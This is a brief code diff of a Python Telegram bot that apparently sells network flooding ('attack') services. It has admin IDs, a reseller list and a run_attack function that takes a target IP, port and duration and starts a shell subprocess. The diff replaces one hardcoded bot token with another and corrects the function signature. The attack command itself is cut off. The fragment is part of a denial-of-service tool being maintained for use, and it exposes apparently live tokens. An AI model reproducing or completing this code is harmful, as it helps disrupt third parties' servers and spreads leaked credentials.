@@ -17,7 +17,7 @@ import subprocess
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7633435652:AAFT6uodtFKq1xi3EGfFYjGpgecGc66MgAE')
+bot = telebot.TeleBot('7775840737:AAFmUfq_O-IctYTJ13ErkiJ-_8XQqiGL-dA')
 
 # Admin user IDs
 admin_id = {"6768273586", "2007860433"}
@@ -130,7 +130,7 @@ def save_resellers(resellers):
 resellers = load_resellers()
 
 
-async def run_attack(message.chat.id, ip, port, time):
+async def run_attack(chat_id, ip, port, time):
     try:
         # Execute the attack command using a subprocess
         process = await asyncio.create_subprocess_shell(
